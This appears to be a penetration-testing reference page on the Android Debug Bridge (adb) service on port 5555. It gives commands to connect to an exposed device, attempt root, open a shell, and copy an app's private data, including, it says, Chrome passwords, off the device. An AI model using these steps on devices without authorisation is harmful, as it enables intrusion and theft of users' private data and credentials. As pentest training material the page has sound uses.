{{#include /banners/hacktricks-training.md}}



## Basic Information

From [the docs](https://developer.android.com/studio/command-line/adb):

**Android Debug Bridge** (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as i**nstalling and debugging apps**, and it provides **access to a Unix shell** that you can use to run a variety of commands on a device.

**Default port**: 5555.

```
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)
```

## Connect

If find the ADB service running in a port of a device and you can connect to it, **you can get a shell inside the system:**

```bash
adb connect 10.10.10.10
adb root # Try to escalate to root
adb shell
```

### Dump App data

In order to completely download the data of an application you can:

```bash
# From a root console
chmod 777 /data/data/com.package
cp -r /data/data/com.package /sdcard Note: Using ADB attacker cannot obtain data directly by using command " adb pull /data/data/com.package". He is compulsorily required to move data to Internal storage and then he can pull that data.
adb pull "/sdcard/com.package"
```

You can use this trick to **retrieve sensitive information like chrome passwords**. For more info about this check the information a references provided [**here**](https://github.com/carlospolop/hacktricks/issues/274).
